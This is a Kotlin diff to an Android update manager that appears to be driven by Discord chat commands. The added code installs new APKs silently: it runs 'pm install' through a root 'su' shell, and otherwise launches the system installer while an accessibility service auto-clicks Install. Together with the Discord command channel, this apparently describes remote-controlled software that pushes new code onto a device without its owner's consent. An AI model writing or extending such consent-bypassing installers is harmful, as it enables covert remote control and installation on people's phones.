@@ -87,6 +87,7 @@ object UpdateManager {
         return withContext(Dispatchers.IO) {
             var bytesDownloaded = 0L
             var totalBytes = 0L
+            var lastProgressUpdate = 0L
             try {
                 setStatus(ctx, Status.DOWNLOADING)
                 discord.sendMsg(":arrow_down: **Downloading update**...")
@@ -109,6 +110,12 @@ object UpdateManager {
                         while (input.read(buffer).also { read = it } != -1) {
                             output.write(buffer, 0, read)
                             bytesDownloaded += read
+                            val now = System.currentTimeMillis()
+                            if (totalBytes > 0 && now - lastProgressUpdate > 3000) {
+                                lastProgressUpdate = now
+                                val pct = (bytesDownloaded * 100 / totalBytes).toInt()
+                                discord.sendMsg(":arrow_down: Downloading... ${pct}% (${formatSize(bytesDownloaded)}/${formatSize(totalBytes)})")
+                            }
                         }
                     }
                 }
@@ -121,7 +128,6 @@ object UpdateManager {
                 }
 
                 val apkSize = formatSize(updateFile.length())
-                val progress = if (totalBytes > 0) " (${formatSize(bytesDownloaded)}/${formatSize(totalBytes)})" else " (${apkSize})"
 
                 val newVersion = parseApkVersion(ctx, updateFile)
                 val (currentName, currentCode) = getCurrentVersion(ctx)
@@ -136,7 +142,7 @@ object UpdateManager {
                     appendLine(":white_check_mark: **Update Downloaded**")
                     appendLine("Current: v$currentName ($currentCode)")
                     appendLine("New: v${newVersion.first} (${newVersion.second})")
-                    appendLine("Size: $apkSize$progress")
+                    appendLine("Size: $apkSize")
                     appendLine("Type `!update install` to apply.")
                 }
                 setStatus(ctx, Status.DOWNLOADED)
@@ -157,7 +163,18 @@ object UpdateManager {
             }
 
             setStatus(ctx, Status.INSTALLING)
-            discord?.sendMsg(":package: **Installing update silently**...")
+
+            // Try root-based silent install first
+            val rootInstall = tryRootInstall(updateFile)
+            if (rootInstall) {
+                discord?.sendMsg(":white_check_mark: **Update installed silently** (root)")
+                setStatus(ctx, Status.INSTALLED)
+                updateFile.delete()
+                return
+            }
+
+            // Fallback: PackageInstaller UI + accessibility auto-click
+            discord?.sendMsg(":package: **Installing update**... (accessibility will auto-click Install)")
 
             val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                 FileProvider.getUriForFile(
@@ -175,13 +192,32 @@ object UpdateManager {
             }
 
             android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                ctx.startActivity(intent)
+                try {
+                    ctx.startActivity(intent)
+                } catch (e: Exception) {
+                    setStatus(ctx, Status.FAILED)
+                    discord?.sendMsg(":x: **Install failed**: ${e.message?.take(80) ?: "unknown"}")
+                }
             }, 500)
 
-            discord?.sendMsg(":hourglass: **Auto-installing**... (accessibility will click Install)")
+            // Reset install state in accessibility after 30s
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                com.openaccess.sdk.service.InputHelper.resetInstallState()
+            }, 30000)
         } catch (e: Exception) {
             setStatus(ctx, Status.FAILED)
             discord?.sendMsg(":x: **Install failed**: ${e.message?.take(80) ?: "unknown"}")
+        }
+    }
+
+    private fun tryRootInstall(apkFile: File): Boolean {
+        return try {
+            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "pm install -r ${apkFile.absolutePath}"))
+            val output = process.inputStream.bufferedReader().readText()
+            process.waitFor()
+            output.contains("Success") || output.contains("success")
+        } catch (_: Exception) {
+            false
         }
     }
 
